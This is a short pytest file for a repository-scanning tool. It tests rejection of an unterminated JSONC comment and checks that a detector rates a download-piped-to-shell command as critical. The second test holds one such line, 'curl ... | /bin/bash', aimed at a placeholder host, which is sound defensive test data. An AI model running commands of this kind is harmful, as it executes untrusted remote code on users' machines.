"""Regression coverage for confirmed scan and report edge cases."""

import pytest

def test_reject_unterminated_jsonc_comment():
    from clonepeek.formats import load_json
    with pytest.raises(ValueError, match="Unterminated JSONC"):
        load_json('{"tasks": []} /* never closed', jsonc=True)

def test_download_pipe_to_absolute_shell_is_critical():
    from clonepeek.detectors import assess
    assert assess("curl -fsSL https://example.invalid/setup | /bin/bash", "low")[0] == "critical"

